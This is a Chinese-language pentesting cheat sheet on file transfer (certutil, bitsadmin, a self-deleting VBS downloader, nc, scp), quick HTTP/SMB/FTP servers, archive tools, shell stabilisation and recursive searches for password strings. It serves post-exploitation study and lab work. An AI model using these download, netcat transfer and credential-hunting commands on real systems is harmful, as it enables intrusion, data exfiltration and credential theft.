上传下载,服务建立,压缩解压缩,提升交互性,查找(文件,内容)

certutil,bitsadmin,vbs,wget,curl,nc,scp,msfconsole,invoke-webrequest

http,smb,tcp,ftp

------

certutil

certutil.exe -urlcache -split -f http://192.168.1.192/file.txt file.txt 

bitsadmin

bitsadmin /rawreturn /transfer down "https://www.baidu.com/robots.txt" c:\robots.txt #c:\robots.txt 必须是绝对路径

vbs

++++++++++++++++++++++++++++++

Set Post = CreateObject("Msxml2.XMLHTTP") 

Set Shell = CreateObject("Wscript.Shell")

Post.Open "GET","http://192.168.11.131:8000/test.txt",0

Post.Send()

Set aGet = CreateObject("ADODB.Stream")

aGet.Mode = 3

aGet.Type = 1

aGet.Open()

aGet.Write(Post.responseBody)

aGet.SaveToFile "C:\Users\qwe2\Desktop\main\test.txt",2

++++++++++++++++++++++++++++++

echo 'Set Post = CreateObject("Msxml2.XMLHTTP"):Set Shell = CreateObject("Wscript.Shell"):Post.Open "GET","http://192.168.11.131:8000/test.txt",0:Post.Send():Set aGet = CreateObject("ADODB.Stream"):aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile "C:\Users\qwe2\Desktop\main\test.txt",2' > download.vbs ; .\download.vbs ; sleep 1 ; del download.vbs

wget(powershell)

wget http://192.168.163.131/pass -o pass

nc

nc -lvnp 443 < pass

.\nc.exe 192.168.163.131 443 > pass1

scp

scp kali@192.168.163.131:/home/kali/main_box/pass pass1

scp pass1 kali@192.168.163.131:/home/kali/pass4

\#和ssh登录一样

-r 递归目录复制

scp -r kali@192.168.163.131:/home/kali/main_box/1 3 #将目录1重命名为3

curl

curl http://xxxxx/xxx -o xxx

msfconsole

download xxx xxx

upload xxx xxx

powershell

Invoke-WebRequest URL -o"本地保存路径"

wget curl 别名

------

服务器建立

http

python -m http.server 8000

python2 -m SimpleHTTPServer 8000

php -S 0:8000 #如果从浏览器访问需要index.php

ruby -run -e httpd . -p 8000

jwebserver -b 0.0.0.0 -p 8000 #java

miniserve -p 8000 . #rust

npx http-server -p 8000 #nodejs

smb

impacket-smbserver guest . -smb2support

impacket-smbserver guest . -username admin -password passwd -smb2support

impacket-smbclient anonymous@192.168.12.130 -no-pass

impacket-smbclient admin:passwd@192.168.12.130 -no-pass

tcp

nc -lvnp 443 < 123.txt

nc xxx.xxx.xxx.xxx 443 > 321.txt

ftp

python -m pyftpdlib -p 21

------

压缩技术详解

gz bz2 xz 不支持多文件

zip rar 7z 支持单文件，多文件，目录结构

tar 支持打包多文件，目录结构

------

gz

gzip 1.txt          #不留存 -k留存

-l 查看文件内容

gzip -d 1.txt.gz     

------

bz2

bzip2 1.txt

-l 查看文件内容

bzip2 -d 1.txt.bz2

------

xz

xz 1.txt

-l 查看文件内容

xz -d 1.txt.xz

------

tar

tar -czvf 1.tar.gz 1 

-cjvf 1.tar.bz2 1

-cJvf 1.tar.xz 1

-xzvf 1.tar.gz

-xjvf 1.tar.bz2

-xJvf 1.tar.xz -C /path/                   -C 解压到对应目录

-tf 查看文件内容

tar -cvf archive.tar file1.txt file2.txt mu 打包多个文件 其中mu是目录

------

zip

zip 1.zip 1

zip -d 1.zip    #留存源文件  -m不留存

unzip 1.zip      

unzip -l 1.zip 查看1.zip 内容

zip -r main.zip 1.txt 2.txt mu                     #其中mu是目录 -r 保留目录结构

zip -r -s 10m main.zip *    -s 10m 分卷压缩 每一卷10mb          解压缩时用7z解压缩

zip -e -P "123" 1.txt.zip 1.txt     -e 设置密码，-P 静默输入密码，但会留存记录

------

rar

rar a 1.rar 1

rar x 1.rar

rar l 1.rar 查看1.rar的内容

-m0最快压缩    -m5 最大压缩率

-v20m 分卷压缩，每卷20m m=MB, k=KB, g=GB

-p12345 密码 可用" "括起来,\"代表字符"

rar a -p12345 -m0 -v20m 1.rar 1

------

7z

7z -l 列出其中的内容

7z a -p12345 1.7z 1

7z x 1.7z

-mx=0 -mx=5 -mx=9   0仅仅存储，5正常默认，9最大压缩

-v100m   分卷压缩

-pPassword  加密

------

.cab[单文件]

makecab

mackcab 1.txt 1.cab

expand rar.cab rar.exe

cabextract

cabextract 1.cab / 7z x 1.cab

------

compress-archive 123.jpg 123.zip

compress-archive 文件夹 文件夹.zip

expand-archive 123.zip 123.jpg

expand-archive 文件夹 文件夹.zip

------

提升交互性

RunasCs.exe one one -l 8 "cmd /c whoami"

python -c "import pty;pty.spawn('/bin/bash')"

stty raw -echo

export TERM=xterm-color

rlwrap -cAr 

------

查找文件(文件,内容)

windows

(cmd)

dir /s /i ".\*passw*" #查找带passw字样的 目录和文件名

findstr /s /i /n /c:"passw" /c:"secu" c:\users\qwe2\desktop\*.txt c:\users\qwe2\desktop\*.docx #查找带passw/secu字样的文件内容的 行   /s 递归 /i 不区分大小写 /n 带行号 /r 正则匹配 /c 匹配词 *.* / *.txt

(powershell)

gci -Path . -Recurse -Force | ? { $_.Name -like "*passw*" } #查找带passw字样的 目录和文件名

gci -Path . -recurse | ? {$_.name -like "*.txt" } | sls -Pattern "passw" #递归查找txt文件中包含passw字样的 行

linux

find /tmp/. -iname "*passw*" #查找带passw字样的 目录和文件名

grep -ir "pass" . #查找带passw的文件内容的 行